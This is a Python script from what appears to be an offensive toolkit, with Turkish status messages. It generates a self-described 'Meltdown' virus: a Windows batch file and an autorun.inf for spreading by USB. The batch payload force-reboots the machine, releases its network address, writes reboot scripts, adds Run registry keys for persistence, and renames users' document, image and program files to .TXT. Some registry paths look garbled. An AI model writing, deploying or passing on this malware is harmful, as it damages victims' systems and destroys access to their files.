import sys
import colorama 
from colorama import Fore
import os
import time
from subprocess import getoutput
if len(sys.argv) < 2:
    exit()

# folder = sys.argv[1]
name = sys.argv[1]+".bat"
path = "/usr/share/blest-framework/devices/USB"


code = f'''
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo lecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE

'''
autorun_script = f'''
[autorun]
Open={name}
ShellExecute={name}
UseAutoPlay=1
'''
# print(Fore.BLUE+'[i]'+Fore.RESET+' Building...')
time.sleep(1)
os.system(f'touch {path}/autorun.inf')
print(Fore.BLUE+'[i]'+Fore.RESET+' "autorun.inf" Dosyası oluşturuluyor ve modifie ediliyor...')
try:
    with open(path+'/autorun.inf', 'w') as run:
        run.write(autorun_script)
    # print(Fore.BLUE+'[i]'+Fore.RESET+' Done.')
    print(Fore.BLUE+'[i]'+Fore.RESET+f' Dosya "{name}" Oluşturuluyor ve modifie ediliyor...')
    time.sleep(1)
    os.system(f'touch {path}/{name}')
    with open(path+'/'+name, 'w') as main:
        main.write(code)
    # print(Fore.YELLOW+'[+]'+Fore.RESET+f' Tamamlandı, Dosya "{name}" olarak kaydedildi')
    print(Fore.BLUE+'[i]'+Fore.RESET+f' "Meltdown" Virüs başarıyla yaratıldı: "{name}"')
except:
    pass